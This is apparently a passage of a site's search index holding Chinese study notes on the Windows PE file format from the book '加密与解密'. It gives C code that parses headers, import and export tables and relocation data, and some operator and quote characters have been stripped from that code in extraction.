(pNtH-\nSignature != IMAGE_NT_SIGNATURE )\n        return FALSE;\n\n    return TRUE;\n\n}\n\n\n\n\n10.15.2  FileHeader和OptionalHeader内容的读取\n\n\n\n\nGetNtHeaders\n\n\n\n\n```c\n   PIMAGE_NT_HEADERS  GetNtHeaders(LPVOID ImageBase)\n   {\n\n\nif(!IsPEFile(ImageBase))\n    return NULL;\nPIMAGE_NT_HEADERS  pNtH;\nPIMAGE_DOS_HEADER  pDH;\npDH=(PIMAGE_DOS_HEADER)ImageBase;\npNtH=(PIMAGE_NT_HEADERS)((DWORD)pDH+pDH-\ne_lfanew);\n\nreturn pNtH;\n\n\n\n}\n\n\n```\n\n\n\n\nGetFileHeader\n\n\n\n\n```c\n   PIMAGE_FILE_HEADER   GetFileHeader(LPVOID ImageBase)\n   {\n       PIMAGE_DOS_HEADER  pDH=NULL;\n       PIMAGE_NT_HEADERS  pNtH=NULL;\n       PIMAGE_FILE_HEADER pFH=NULL;\n\n\n   if(!IsPEFile(ImageBase))\n    return NULL;\n   pDH=(PIMAGE_DOS_HEADER)ImageBase;\n   pNtH=(PIMAGE_NT_HEADERS)((DWORD)pDH+pDH-\ne_lfanew);\n   pFH=\npNtH-\nFileHeader;\n   return pFH;\n\n\n\n}\n   ```\n\n\n\n\nGetOptionalHeader\n\n\n\n\n```c\n   PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPVOID ImageBase)\n   {\n       PIMAGE_DOS_HEADER  pDH=NULL;\n       PIMAGE_NT_HEADERS  pNtH=NULL;\n       PIMAGE_OPTIONAL_HEADER pOH=NULL;\n\n\n    if(!IsPEFile(ImageBase))\n    return NULL;\n   pDH=(PIMAGE_DOS_HEADER)ImageBase;\n   pNtH=(PIMAGE_NT_HEADERS)((DWORD)pDH+pDH-\ne_lfanew);\n   pOH=\npNtH-\nOptionalHeader;\n   return pOH;\n\n\n\n}\n   ```\n\n\n\n\n显示文件头信息\n\n\n\n\n```c\n   void    ShowFileHeaderInfo(HWND hWnd)\n   {  \n\n    char   cBuff[10];\n        PIMAGE_FILE_HEADER pFH=NULL;\n\n\n pFH=GetFileHeader(stMapFile.ImageBase);\n    if(!pFH)\n {\n     MessageBox(hWnd,\"Can't get File Header ! :(\",\"PEInfo_Example\",MB_OK);\n     return;\n }\n wsprintf(cBuff, \"%04lX\", pFH-\nMachine);\n SetDlgItemText(hWnd,IDC_EDIT_FH_MACHINE,cBuff);\n\n wsprintf(cBuff, \"%04lX\", pFH-\nNumberOfSections);\n SetDlgItemText(hWnd,IDC_EDIT_FH_NUMOFSECTIONS,cBuff);\n\n wsprintf(cBuff, \"%08lX\", pFH-\nTimeDateStamp);\n SetDlgItemText(hWnd,IDC_EDIT_FH_TDS,cBuff);\n\n wsprintf(cBuff, \"%08lX\", pFH-\nPointerToSymbolTable);\n SetDlgItemText(hWnd,IDC_EDIT_FH_PTSYMBOL,cBuff);\n\n wsprintf(cBuff, \"%08lX\", pFH-\nNumberOfSymbols);\n SetDlgItemText(hWnd,IDC_EDIT_FH_NUMOFSYM,cBuff);\n\n wsprintf(cBuff, \"%04lX\", pFH-\nSizeOfOptionalHeader);\n SetDlgItemText(hWnd,IDC_EDIT_FH_SIZEOFOH,cBuff);\n\n wsprintf(cBuff, \"%04lX\", pFH-\nCharacteristics);\n SetDlgItemText(hWnd,IDC_EDIT_FH_CHARACTERISTICS,cBuff);\n\n\n\n}\n   ```\n\n\n10.15.3  得到数据目录表信息\n\n\nvoid ShowDataDirInfo(HWND hDlg)\n{\n    char   cBuff[9];\n    PIMAGE_OPTIONAL_HEADER pOH=NULL;\n    pOH=GetOptionalHeader(stMapFile.ImageBase);\n   if(!pOH)\n        return;\n\n    for(int i=0;i\n16;i++)\n   {\n    wsprintf(cBuff, \n%08lX\n, pOH-\nDataDirectory[i].VirtualAddress);\n    SetDlgItemText(hDlg,EditID_Array[i].ID_RVA,cBuff);\n\n     wsprintf(cBuff, \n%08lX\n, pOH-\nDataDirectory[i].Size);\n     SetDlgItemText(hDlg,EditID_Array[i].ID_SIZE,cBuff);\n    }\n\n}\n\n\n\n\n10.15.4  得到区块表信息\n\n\nvoid ShowSectionHeaderInfo(HWND hDlg)\n{\n    LVITEM                  lvItem;\n    char                    cBuff[9],cName[9]; \n    WORD                    i;\n    PIMAGE_FILE_HEADER       pFH=NULL;\n    PIMAGE_SECTION_HEADER   pSH=NULL;\n\n\n    pFH=GetFileHeader(stMapFile.ImageBase);\n    if(!pFH)\n        return;\n\n    pSH=GetFirstSectionHeader(stMapFile.ImageBase);\n\n    for( i=0;i\npFH-\nNumberOfSections;i++)\n    {\n        memset(\nlvItem, 0, sizeof(lvItem));\n        lvItem.mask    = LVIF_TEXT;\n        lvItem.iItem   = i;\n\n        memset(cName,0,sizeof(cName));\n        memcpy(cName, pSH-\nName, 8);\n\n        lvItem.pszText = cName;\n        SendDlgItemMessage(hDlg,IDC_SECTIONLIST,LVM_INSERTITEM,0,(LPARAM)\nlvItem);\n\n        lvItem.pszText  = cBuff;\n        wsprintf(cBuff, \n%08lX\n, pSH-\nVirtualAddress);\n        lvItem.iSubItem = 1;\n        SendDlgItemMessage(hDlg,IDC_SECTIONLIST, LVM_SETITEM, 0, (LPARAM)\nlvItem);\n        ...\n\n        ++pSH;\n    }\n\n\n\n\n\n\n10.15.5  得到输出表信息\n\n\nvoid   ShowExportFuncsInfo(HWND hDlg)\n{\n    HWND         hList;\n    LVITEM       lvItem;\n    char         cBuff[10], *szFuncName; \n\n    UINT                    iNumOfName=0;\n    PDWORD                  pdwRvas, pdwNames;\n    PWORD                   pwOrds;\n    UINT                    i=0,j=0,k=0; \n    BOOL                    bIsByName=FALSE;;\n\n\n    PIMAGE_NT_HEADERS       pNtH=NULL;\n    PIMAGE_EXPORT_DIRECTORY pExportDir=NULL;\n\n    pNtH=GetNtHeaders(stMapFile.ImageBase);\n    if(!pNtH)\n        return ;\n    pExportDir= (PIMAGE_EXPORT_DIRECTORY)GetExportDirectory(stMapFile.ImageBase);\n    if (!pExportDir)\n            return ; \n\n\n    pwOrds    = (PWORD)RvaToPtr(pNtH, stMapFile.ImageBase,pExportDir-\nAddressOfNameOrdinals);\n    pdwRvas   = (PDWORD)RvaToPtr(pNtH, stMapFile.ImageBase,pExportDir-\nAddressOfFunctions);\n    pdwNames  = (PDWORD)RvaToPtr(pNtH, stMapFile.ImageBase,pExportDir-\nAddressOfNames);\n\n    if(!pdwRvas)\n        return;\n\n    hList=GetDlgItem(hDlg,IDC_EXPORT_LIST);\n    SendMessage(hList,LVM_SETEXTENDEDLISTVIEWSTYLE,0,(LPARAM)LVS_EX_FULLROWSELECT);\n\n\n    iNumOfName=pExportDir-\nNumberOfNames;\n\n    for( i=0;i\npExportDir-\nNumberOfFunctions;i++)\n    {\n        if(*pdwRvas)\n        {    \n            for( j=0;j\niNumOfName;j++)\n            {\n                if(i==pwOrds[j])\n                {  \n                    bIsByName=TRUE;\n                    szFuncName=(char*)RvaToPtr(pNtH,stMapFile.ImageBase,pdwNames[j]);\n                    break;\n                }\n\n                bIsByName=FALSE;\n            }\n\n            //show funcs to listctrl\n\n        memset(\nlvItem, 0, sizeof(lvItem));\n        lvItem.mask    = LVIF_TEXT;\n        lvItem.iItem   = k;\n\n        lvItem.pszText = cBuff;\n        wsprintf(cBuff, \n%04lX\n, (UINT)(pExportDir-\nBase+i));\n        SendDlgItemMessage(hDlg,IDC_EXPORT_LIST,LVM_INSERTITEM,0,(LPARAM)\nlvItem);\n\n        lvItem.pszText  = cBuff;\n        wsprintf(cBuff, \n%08lX\n, (*pdwRvas));\n        lvItem.iSubItem = 1;\n        SendDlgItemMessage(hDlg,IDC_EXPORT_LIST, LVM_SETITEM, 0, (LPARAM)\nlvItem);\n\n        if(bIsByName)           \n            lvItem.pszText=szFuncName;\n        else\n            lvItem.pszText  = \n-\n;\n\n        lvItem.iSubItem = 2;\n        SendDlgItemMessage(hDlg,IDC_EXPORT_LIST, LVM_SETITEM, 0, (LPARAM)\nlvItem);\n\n\n           //\n        ++k;\n\n        }\n\n            ++pdwRvas;\n\n }\n\n\n\n\n\n10.15.6  得到输入表信息\n\n\n\n\n找到输入表的位置\n\n\n\n\nPIMAGE_IMPORT_DESCRIPTOR  GetFirstImportDesc(LPVOID ImageBase)\n{\n    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;\n    pImportDesc=(PIMAGE_IMPORT_DESCRIPTOR)GetDirectoryEntryToData(ImageBase,IMAGE_DIRECTORY_ENTRY_IMPORT);\n    if(!pImportDesc)\n        return NULL;     \n    return  pImportDesc;\n}\n\n\n\n\n\n\n循环输出整个表\n\n\n\n\nvoid  ShowImportDescInfo(HWND hDlg)\n{\n    HWND         hList;\n    LVITEM       lvItem;\n    char         cBuff[10], * szDllName; \n\n    PIMAGE_NT_HEADERS       pNtH=NULL;\n    PIMAGE_IMPORT_DESCRIPTOR  pImportDesc=NULL;\n\n    memset(\nlvItem, 0, sizeof(lvItem));\n\n    hList=GetDlgItem(hDlg,IDC_IMPORT_LIST);\n    SendMessage(hList,LVM_SETEXTENDEDLISTVIEWSTYLE,0,(LPARAM)LVS_EX_FULLROWSELECT);\n\n    pNtH=GetNtHeaders(stMapFile.ImageBase);\n    pImportDesc=GetFirstImportDesc(stMapFile.ImageBase);\n    if(!pImportDesc)\n    {\n        MessageBox(hDlg,\nCan't get ImportDesc:(\n,\nPEInfo_Example\n,MB_OK);\n        return;\n    }\n\n    int i=0;\n    while(pImportDesc-\nFirstThunk)\n    {\n\n        memset(\nlvItem, 0, sizeof(lvItem));\n        lvItem.mask    = LVIF_TEXT;\n        lvItem.iItem   = i;\n\n        szDllName=(char*)RvaToPtr(pNtH,stMapFile.ImageBase,pImportDesc-\nName);\n\n...\n       ++i;\n       ++pImportDesc;\n    }\n\n}", 
            "title": "加密与解密 第十章 PE文件格式"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#pe", 
            "text": "主要文件： winnt.h -  image format    PE布局", 
            "title": "第十章  PE文件格式"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#101-pe", 
            "text": "磁盘文件偏移和内存偏移的转换", 
            "title": "10.1  PE的基本概念"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1011", 
            "text": "模块：加载到内存中的PE文件被称为模块    模块句柄（hModule）：映射文件的起始地址，这个初始内存地址也称作基地址（ImageBase）    访问DLL文件,得到指针：    c\n  HMODULE GetModuleHandle(LPCTSTR lpModuleName);", 
            "title": "10.1.1  基地址"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1012", 
            "text": "相对地址（RVA）：内存中，相对于ImageBase的偏移  目标地址401000h - 装入地址 400000h = RVA 1000h   虚拟地址(VA) = 基地址（Image Base） + 相对虚拟地址（RVA）", 
            "title": "10.1.2  相对虚拟地址"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1013", 
            "text": "FileOffset/RawOffset:PE文件存储在磁盘上时，相对于文件头的偏移，起始值时0", 
            "title": "10.1.3  文件偏移地址"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#102-ms-dos", 
            "text": "DOS头部 = DOS MZ 头 + DOS stub  typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header\n    WORD   e_magic;                     // Magic number\n    WORD   e_cblp;                      // Bytes on last page of file\n    WORD   e_cp;                        // Pages in file\n    WORD   e_crlc;                      // Relocations\n    WORD   e_cparhdr;                   // Size of header in paragraphs\n    WORD   e_minalloc;                  // Minimum extra paragraphs needed\n    WORD   e_maxalloc;                  // Maximum extra paragraphs needed\n    WORD   e_ss;                        // Initial (relative) SS value\n    WORD   e_sp;                        // Initial SP value\n    WORD   e_csum;                      // Checksum\n    WORD   e_ip;                        // Initial IP value\n    WORD   e_cs;                        // Initial (relative) CS value\n    WORD   e_lfarlc;                    // File address of relocation table\n    WORD   e_ovno;                      // Overlay number\n    WORD   e_res[4];                    // Reserved words\n    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)\n    WORD   e_oeminfo;                   // OEM information; e_oemid specific\n    WORD   e_res2[10];                  // Reserved words\n    LONG   e_lfanew;                    // File address of new exe header\n  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;   e_magic：MZ  e_lfanew: PE头的真正偏移量", 
            "title": "10.2  MS-DOS头部"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#103-pe", 
            "text": "PNETHeader = ImageBase + dosHeaser- e_lfanew  typedef struct _IMAGE_NT_HEADERS {\n    DWORD Signature;\n    IMAGE_FILE_HEADER FileHeader;\n    IMAGE_OPTIONAL_HEADER32 OptionalHeader;\n} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;", 
            "title": "10.3  PE文件头"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1031-signature", 
            "text": "作用：用来验证该文件是否时PE文件  #define IMAGE_NT_SIGNATURE                  0x00004550  // PE00", 
            "title": "10.3.1  Signature字段"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1032-image_file_header", 
            "text": "typedef struct _IMAGE_FILE_HEADER {\n    WORD    Machine;\n    WORD    NumberOfSections;\n    DWORD   TimeDateStamp;\n    DWORD   PointerToSymbolTable;\n    DWORD   NumberOfSymbols;\n    WORD    SizeOfOptionalHeader;\n    WORD    Characteristics;\n} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;  字段：   SizeOfOptionalHeader：OptionalHeader字段的大小   重要  Characteristics：   普通exe文件：010fh  DLL文件：0210h", 
            "title": "10.3.2  IMAGE_FILE_HEADER结构"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1033-image_optional_header", 
            "text": "typedef struct _IMAGE_OPTIONAL_HEADER {\n    //\n    // Standard fields.\n    //\n\n    WORD    Magic;\n    BYTE    MajorLinkerVersion;\n    BYTE    MinorLinkerVersion;\n    DWORD   SizeOfCode;\n    DWORD   SizeOfInitializedData;\n    DWORD   SizeOfUninitializedData;\n    DWORD   AddressOfEntryPoint;\n    DWORD   BaseOfCode;\n    DWORD   BaseOfData;\n\n    //\n    // NT additional fields.\n    //\n\n    DWORD   ImageBase;\n    DWORD   SectionAlignment;\n    DWORD   FileAlignment;\n    WORD    MajorOperatingSystemVersion;\n    WORD    MinorOperatingSystemVersion;\n    WORD    MajorImageVersion;\n    WORD    MinorImageVersion;\n    WORD    MajorSubsystemVersion;\n    WORD    MinorSubsystemVersion;\n    DWORD   Win32VersionValue;\n    DWORD   SizeOfImage;\n    DWORD   SizeOfHeaders;\n    DWORD   CheckSum;\n    WORD    Subsystem;\n    WORD    DllCharacteristics;\n    DWORD   SizeOfStackReserve;\n    DWORD   SizeOfStackCommit;\n    DWORD   SizeOfHeapReserve;\n    DWORD   SizeOfHeapCommit;\n    DWORD   LoaderFlags;\n    DWORD   NumberOfRvaAndSizes;\n    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];\n} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;  字段：    Magic    ROM映像：0107h   普通可执行的映像：010Bh   PE32+：020Bh    SizeOfCode    多数文件只有一个code块，所以这个字段和.text的大小匹配    SizeOfUninitializedData    未初始化数据通常位于.bss段   AddressOfEntryPoint   程序执行入口的RVA   BaseofCode   代码段的RVA，通常为1000h  PS : 查看了本书的几个示例：   pe.exe和pediy.exe的入口地址和代码基址是相同的   tls.exe和delaydll.exe的入口地址和代码基址是不同的    [ ]   进一步研究原因    BaseOfData：数据段的起始RVA    ImageBase：映像基址    SectionAlignment ：装入内存时的区块对齐大小，默认是目标CPU的页尺寸，win98/me上，最小一页是1000h    FileAlignment ：磁盘上PE文件的对齐大小，对x86，通常是200h或者1000h    SizeOfImage：装入内存后的总尺寸    SizeOfHeaders：MS-DOS头、PE头、区块表的组合尺寸    NumberOfRvaAndSizes: 数据目录的项数：16    DataDirectory[16]: 数据目录表，单个项目的结构如下：    ```c\n  typedef struct _IMAGE_DATA_DIRECTORY {\n      DWORD   VirtualAddress;\n      DWORD   Size;\n  } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;  ```  项目如下：", 
            "title": "10.3.3  IMAGE_OPTIONAL_HEADER结构"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#104", 
            "text": "", 
            "title": "10.4  区块"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1041", 
            "text": "结构：   c\n  typedef struct _IMAGE_SECTION_HEADER {\n      BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];\n      union {\n              DWORD   PhysicalAddress;\n              DWORD   VirtualSize;\n      } Misc;\n      DWORD   VirtualAddress;\n      DWORD   SizeOfRawData;\n      DWORD   PointerToRawData;\n      DWORD   PointerToRelocations;\n      DWORD   PointerToLinenumbers;\n      WORD    NumberOfRelocations;\n      WORD    NumberOfLinenumbers;\n      DWORD   Characteristics;\n  } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;  示例：     name：块名    VirtualSize（VSize）：实际的、被使用的区块大小，是区块在没被对齐处理之前的大小    VitrualAddress（Voffset）：装载到内存中的RVA，按照内存对齐，默认为1000h    SizeOfRawData（Rsize）：在磁盘中的大小，经过了对齐，FileAlignment默认大小为200h    PointerToRawData（Roffset）：磁盘文件中的偏移。如果程序自装载，这个字段比VitrualAddress更重要    Characteristics：     这里指定了区块的可读、可写、可执行属性", 
            "title": "10.4.1  区块表"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1042", 
            "text": "本章未涉及到的区块从略    自定义区块，在vc++中：    c\n  #prama data_seg(\"My_Data\")  定义后，vc++处理的所有数据都会放到上述的区块中，而不是默认的.data区块中    区块的形成：链接器从全部obj中提取相似一致属性的块合并成一个块    链接器合并区块：使用 /merge 开关     /MERGE:.rdata=.text ;将rdata段和text段合并", 
            "title": "10.4.2  各种区块的描述"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1043", 
            "text": "对齐值种类    内存对齐  默认对齐值：1000h（4KB）    磁盘文件对齐  典型对齐值：200h", 
            "title": "10.4.3  区块的对齐值"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1044", 
            "text": "关系：   File Offset = RVA - k\n  File Offset = VA - Imagebase - k   各区段偏移量", 
            "title": "10.4.4  文件偏移与虚拟地址转换"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#105", 
            "text": "输入：可执行文件使用来自其他DLL的代码或者数据时，称为输入  作用：定位所有被输入的函数和数据，让正在被装入的文件可以使用这些地址，windows加载器就需要使用输入表（improt table，IT，导入表）", 
            "title": "10.5  输入表"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1051", 
            "text": "调用方式    隐式调用  由windows加载器完成    显式调用  由程序自己调用LoadLibrary和GetProcessAddress完成    输入地址表（IAT）    调用一个输入函数的实际过程   默认方式   asm\nCALL DWORD PTR [00402010]  地址 00402010 位于IAT中，但实际的调用代码如下：  asm\n    Call 00401164\n...\n:00401164\n    jmp dword ptr  [00402010]   问题：代码低效  原因：  编译器无法识别输入函数的调用和普通函数的调用   编译器生成类似 call xxxxxx 的指令，而 xxxxxx 需要由链接器填充，该指令不是从函数指针处得来，而是从代码的实际地址而来，为了因果平衡，简单的方法就是产生上述的 jmp stub    优化：    使用 __declspec(dllimport) 修饰函数，得到的指令形式如下：  asm\n   CALL XXXXXXXX", 
            "title": "10.5.1  输入函数的调用"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1052", 
            "text": "头文件定义   ```asm\n  typedef struct _IMAGE_IMPORT_DESCRIPTOR {\n      union {\n          DWORD   Characteristics;            // 0 for terminating null import descriptor\n          DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)\n      };\n      DWORD   TimeDateStamp;                  // 0 if not bound,\n                                              // -1 if bound, and real date\\time stamp\n                                              //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)\n                                              // O.W. date/time stamp of DLL bound to (Old BIND)    DWORD   ForwarderChain;                 // -1 if no forwarders \n  DWORD   Name;\n  DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)  } IMAGE_IMPORT_DESCRIPTOR;\n  typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;  ```   结构图     IMAGE_THUNK_DATA 的定义如下   c\n  typedef struct _IMAGE_THUNK_DATA32 {\n      union {\n          DWORD ForwarderString;      // PBYTE \n          DWORD Function;             // PDWORD\n          DWORD Ordinal;\n          DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME\n      } u1;\n  } IMAGE_THUNK_DATA32;\n  typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;    ForwarderString：  可以看出，INT和IAT其实都是链表结构， ForwarderString 指针指向下一个表项，其结构也是IMAGE_THUNK_DATA     AddressOfData：指向函数名，这里包含在数据结构 IMAGE_IMPORT_BY_NAME 中    IMAGE_IMPORT_BY_NAME 的定义    c\n  typedef struct _IMAGE_IMPORT_BY_NAME {\n      WORD    Hint;\n      BYTE    Name[1];\n  } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;", 
            "title": "10.5.2  输入表结构"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1053-iat", 
            "text": "IAT和INT结构相同是否是重复？   INT表（又称为提示名表Hint-name Table）不可以改写，IAT由PE装载器重写    执行流程    PE装载器首先搜索 OriginalFirstThunk    如果找到，加载器迭代搜索数组中的每一个指针（ *PIMAGE_IMPORT_BY_NAME ），依据其中的函数名 Name 找到其指向的输入函数的地址    找到地址之后，会将IAT表中 IMAGE_IMPORT_BY_NAME 中的Name字段替换为真实的函数地址，这个时候，IT结构中除了IAT表之外的结构就已经不需要了    PE加载器加载完成的图如下所示：     例外情况    函数仅由序号引出   不能用函数名调用，只能通过他们的位置调用  将 IMAGE_THUNK_DATA 的最高二进位设置为1，用低字节指示函数序数     orignalFirstThunk的值为0  使用 FirstThunk 来替代 orignalFirstThunk 的作用  [ ]    这里不是很懂，以后再来分析", 
            "title": "10.5.3  输入地址表（IAT）"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1054", 
            "text": "分析pe.exe    确定IT表的位置  IT指针RVA : B0h(相对pe头的偏移) + 80h（pe头的RVA） = 130h    计算IT表的物理位置（包含多个IDD项）  130h处的四字节为：40 20 00 00  即地址为 00002040h   2040h 位于.rdata段，虚拟偏移和物理偏移的差值k=2000h-600h=1A00h  2040h 的物理偏移：2040h - 1A00h = 640h     读取IT表的内容  定位到640h处，可以看到其IDD内容，每个IDD有五个双字   整理后的结果：     确定Name名称  以第一个为例：    Name字段的值为 74210000 ，转换成RVA：00002174h，转换成物理偏移：774h    查看该处地址值，为：USER32.dll    查找后的数组如下       查找USER32.dll中被调用的函数    查看IDD的OriginalFirstThunk字段 208ch ，计算得到物理偏移 208ch-1A00h=68Ch    在 68Ch 处找到 IMAGE_THUNK_DATA  数组，它存储着指向 _IMAGE_IMPORT_BY_NAME 结构的指针，结果如下：     查看同一IDD的 FirstThunk ，在其偏移处610h（2010h - 1A00h）得到 IMAGE_THUNK_DATA  ，和上表中的字段 == 完全一致 ==  PS：这是书中的说法，但我实际测试发现，其实610h处是一段字符串，并不一致，如下：   pe.exe也是使用书中给出的样本，感觉这里作者可能有错误，如果大家发现了是我的问题，还请不吝赐教:thinking:    先看前两个函数调用   2100h - 1A00h = 710h，该处地址字符串为：LoadIconA  211Ch - 1A00h = 71Ch，该处地址字符串为：PostQuitMessage     最后得到所有的函数引用：     得到第一个IDD在PE加载器运行前的结构       查看dump.exe，其为抓取的IDD加载完成后的内存印象     可以发现，其值已经发生了变化，得到下列表格：     查看 77D216DDh 地址处的反汇编代码：   发现就是LoadIconA处的代码    pe.exe装载到内存之后的IDD结构示意图如下：     调用LoadIconA的代码如下：", 
            "title": "10.5.4  输入表实例分析"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#106", 
            "text": "产生的原因：   查找替换函数地址的过程，需要很多的时间   解决办法：   提前将实际地址加载到IAT表中    前提条件：    进程初始化时，需要的DLL实际已经加载到了它们的首选基址    绑定之后，DLL输出表中引用符号的位置一致没有改变    如果出现地址改变，怎么办    加载器从INT表中找到需要信息，重新读取正确的地址   绑定输入位置：   DataDirectory的第11个成员指向，以_IMAGE_BOUND_IMPORT_DESCRIPTOR结构的数组开始  c\n  typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR {\n      DWORD   TimeDateStamp;    被输入DLL的时间，以便加载器快速判断绑定是不是最新的\n      WORD    OffsetModuleName; 指向被输入DLL的名称的偏移，与第一个IBID结构之间的偏移\n      WORD    NumberOfModuleForwarderRefs; 其后ModuleForwarderRefs的数目\n  // Array of zero or more IMAGE_BOUND_FORWARDER_REF follows\n  } IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;  PS：该节内容不大理解，以后用到了再研究", 
            "title": "10.6  绑定输入"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#107", 
            "text": "", 
            "title": "10.7  输出表"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1071-287", 
            "text": "IED结构定义   ```CQL\n  typedef struct _IMAGE_EXPORT_DIRECTORY {\n      DWORD   Characteristics;\n      DWORD   TimeDateStamp;\n      WORD    MajorVersion;\n      WORD    MinorVersion;\n      DWORD   Name; //DLL的名称\n      DWORD   Base; //起始序数值，正常为1，查询输出函数时，将该值减去，得到进入EAT的索引\n      DWORD   NumberOfFunctions;    //EAT中的条目数量\n      DWORD   NumberOfNames;    //ENT表中的条目数量\n      DWORD   AddressOfFunctions;     // EAT的RVA\n      DWORD   AddressOfNames;         // ENT的RVA\n      DWORD   AddressOfNameOrdinals;  // 输出序数表的RVA\n  } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;  ```   典型输出表图     输出序数表起到联系名称表和地址表的作用  输出序数表和名称表一一对应，一同使用，加载器取到名称的同时，也取到了索引  取到索引后，就可以访问输出表了", 
            "title": "10.7.1  输出表结构 287"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1072", 
            "text": "以 DllDemo.dll 为例    数据目录表的第一个成员指向输出表，位于pe文件头的78h偏移处    pe文件头起始位置为100h，得到输出表位置178h（100h+78h）    查看该位置，发现值为 0040000 ，得到内存偏移地址，再转化成物理地址 0C00h    查看该地址处的内容，其结构为 _IMAGE_EXPORT_DIRECTORY    整理后如下：      name:指向DLL的名字   addressOfNames：指向函数名列表   AddressOfNameOrdinals：序号名列表    调用MsgBox工作过程：   定位 _IMAGE_EXPORT_DIRECTORY ，找到ENT地址，知道这个数组里只有1个条目  对名字进行二进制查找，直到找到该函数  直到该函数的序号为1，于是在序号表中读取第一个值，即为MsgBox的输出序数  使用输出序数进入EAT索引，得到MsgBox的RVA：1008h  加上DllDemo的装入地址，得到MsgBox的实际地址", 
            "title": "10.7.2  输出表结构实例分析"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#108", 
            "text": "", 
            "title": "10.8  基址重定位"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1081", 
            "text": "重定位方式：把文件中所有可能需要修改的地址放在一个数组里    以DllDemo.dll为例       dll的基址为400000h， 0040100E 地址处指令中入栈地址的RVA为2000h    如果dll的基址能按照400000h的地址正确加载，则指令形式不变    如果windows加载器决定将其映射到870000h处，加载器会比较基址和实际装入的地址，计算处差值：470000h（870000h-400000h）    这样， 0040100E 地址处的指令就会被修正为： push 872000    示意图如下：     重定位后的代码如下：     exe不需要重定位，但dll会使用宿主exe的空间，所以必须包含重定位信息", 
            "title": "10.8.1  基址重定位概念"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1082", 
            "text": "区块名：.reloc  查找方式：数据目录表中的 BaseRelocationTable  组织方式：按页分割，多个重定位块链接而成  块大小：4KB，必须以4字节对齐  头文件定义   typedef struct _IMAGE_BASE_RELOCATION {\n    DWORD   VirtualAddress; //这一组重定位数据的开始RVA，各重定向的地址必须加上这个RVA才是重定向的完整RVA\n    DWORD   SizeOfBlock;    //当前重定位结构的大小\n    WORD    TypeOffset[1];  //数组，分高4位和低12位，高4位代表重定位类型，低12位代表重定位地址\n                            //该地址与VirtualAddress相加，就得到需要修改数据的地址的指针\n} IMAGE_BASE_RELOCATION;\ntypedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;   示意图", 
            "title": "10.8.2  基址重定位结构定义"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1083", 
